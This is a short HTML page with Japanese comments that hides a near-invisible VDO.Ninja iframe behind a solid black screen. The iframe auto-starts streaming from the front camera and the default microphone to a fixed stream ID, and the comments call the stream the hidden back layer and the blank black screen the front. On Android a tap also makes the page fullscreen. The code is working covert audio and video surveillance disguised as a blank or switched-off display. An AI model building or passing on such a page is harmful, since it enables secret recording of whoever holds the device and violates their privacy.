<!doctype html>
<html lang="ja">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover" />
  <meta name="robots" content="noindex,nofollow" />

  <title>撮影ページ</title>
  <meta name="apple-mobile-web-app-title" content="撮影ページ">
  <meta name="application-name" content="撮影ページ">

  <!-- 疑似フルスクリーン（iOS：ホーム画面追加時に効く） -->
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">

  <style>
    html, body {
      height: 100%;
      margin: 0;
      background: #000;
      overflow: hidden;
    }

    /* ノッチ/ホームバー周りも黒く */
    body {
      padding: env(safe-area-inset-top)
               env(safe-area-inset-right)
               env(safe-area-inset-bottom)
               env(safe-area-inset-left);
      background: #000;
    }

    /* 裏：VDO.Ninja（配信用・見えない） */
    iframe#vdo {
      position: fixed;
      inset: 0;
      width: 100%;
      height: 100%;
      border: 0;
      opacity: 0.001;       /* “ほぼ見えない” */
      pointer-events: none; /* 触れない */
    }

    /* 表：真っ黒レイヤー（文字も何も出さない） */
    #black {
      position: fixed;
      inset: 0;
      background: #000;
      z-index: 10;
      /* どこでもタップできるようにする（Android FS用） */
      pointer-events: auto;
      touch-action: manipulation;
      -webkit-tap-highlight-color: transparent;
    }
  </style>
</head>

<body>
  <!-- 裏：カメラ＋マイク配信 -->
  <iframe
    id="vdo"
    allow="camera *; microphone *; autoplay; fullscreen"
    referrerpolicy="no-referrer"
  ></iframe>

  <!-- 表：黒（文字なし・動画なし） -->
  <div id="black" aria-hidden="true"></div>

  <script>
    const STREAM_ID = "toaCam01";

    // VDO.Ninja：内カメ + 音声あり
    // - facing=user：内カメ
    // - audiodevice=1：デフォルトのマイクを自動選択（選択UIをスキップしやすい）
    // - proaudio：音質寄り（必要なければ消してOK）
    const vdoSrc =
      "https://vdo.ninja/?" +
      "push=" + encodeURIComponent(STREAM_ID) +
      "&webcam" +
      "&autostart" +
      "&facing=user" +
      "&audiodevice=1" +
      "&proaudio" +
      "&cleanoutput" +
      "&hidehome" +
      "&transparent";

    document.getElementById("vdo").src = vdoSrc;

    // Androidのみ：黒画面の“最初の1タップ”でフルスクリーンを要求
    const isAndroid = /Android/i.test(navigator.userAgent);

    async function requestFullscreenOnce() {
      if (!isAndroid) return;
      const el = document.documentElement;
      try {
        if (document.fullscreenElement) return;
        if (el.requestFullscreen) await el.requestFullscreen();
        else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
      } catch (e) {
        // 失敗しても黒画面のまま（仕様通り）
      }
    }

    // どこでもタップでOK（文字表示は一切しない）
    const black = document.getElementById("black");
    let done = false;
    black.addEventListener("click", async () => {
      if (done) return;
      done = true;
      await requestFullscreenOnce();
      // 黒画面は“表示し続ける”のが要件なので消さない
      // 以降のタップでも不要なら、ここで pointer-events を切ってOK：
      black.style.pointerEvents = "none";
    }, { passive: true });
  </script>
</body>
</html>
